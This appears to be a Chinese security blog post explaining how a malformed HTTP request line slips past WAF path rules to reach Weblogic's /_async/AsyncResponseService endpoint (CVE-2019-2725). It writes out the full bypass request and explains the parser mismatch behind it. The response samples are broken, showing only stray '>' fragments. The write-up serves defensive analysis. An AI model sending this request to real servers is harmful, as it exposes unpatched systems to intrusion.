### 绕过WAF的一些方法（一）

#### 前言
Web应用防火墙（WAF）不仅会对POST请求的数据进行检测，还会对访问的URL路径进行限制。例如，对于一些敏感路径如Weblogic的`/_async/AsyncResponseService`（CVE-2019-2725）和`/wls-wsat/CoordinatorPortType*`（CVE-2017-10271），WAF可以阻止这些路径的访问，从而缓解因无法升级或打补丁而带来的安全风险。然而，在最近的一次监控告警中，我们发现某品牌的WAF被绕过，成功上传了webshell。

#### 访问控制绕过
WAF通常会限制对`/_async/*`路径的访问。直接访问`http://x.x.x.x/_async/AsyncResponseService`时，页面无响应。但是，通过修改HTTP头，可以绕过这种限制。

**示例请求：**
```http
GET // HTTP/1.1 /../../_async/AsyncResponseService HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

**绕过原理**
在撰写本文之前，我并未意识到为什么可以通过这种方式绕过WAF的访问限制，同时Weblogic还能正常解析。通过对正常响应报文和绕过WAF后的响应报文进行对比，我发现Weblogic在解析请求行中的URL部分时，匹配条件更为宽松。具体来说，Weblogic在定位请求行的URL部分时，选取了第一个请求方法与最后一个协议版本之间的内容，并且中间的内容即使包含空格也会被转译为`++`号。

因此，重新审视绕过WAF的请求行，Weblogic会认为URL为`http://x.x.x.x/%20HTTP/1.1%20/../../_async/AsyncResponseService`，并通过两层`../../`穿越到根目录，最终访问到敏感路径`/_async/AsyncResponseService`。

**bypass WAF响应：**
```html
>
  >
    >Welcome to the {http://www.bea.com/async/AsyncResponseService}AsyncResponseService home page
      >
        >Test page
        >
      >
      >
        >WSDL page
        >
      >
    >
>
```

**正常响应：**
```html
>
  >
    >Welcome to the {http://www.bea.com/async/AsyncResponseService}AsyncResponseService home page
      >
        >Test page
        >
      >
      >
        >WSDL page
        >
      >
   >
>
```

通过上述对比，我们可以解释为什么Weblogic能够正常解析这个请求。对于绕过WAF的理解也相对简单：一般的WAF规则使用正则表达式来匹配URL路径，只选择从第一个请求方法到第一个协议版本之间的部分。在这种情况下，WAF只选择了`//`部分，而根目录并不是敏感目录，因此绕过了WAF的限制。

#### 总结
绕过WAF的访问控制主要是通过绕过WAF的正则规则，同时确保后端应用能够正常解析。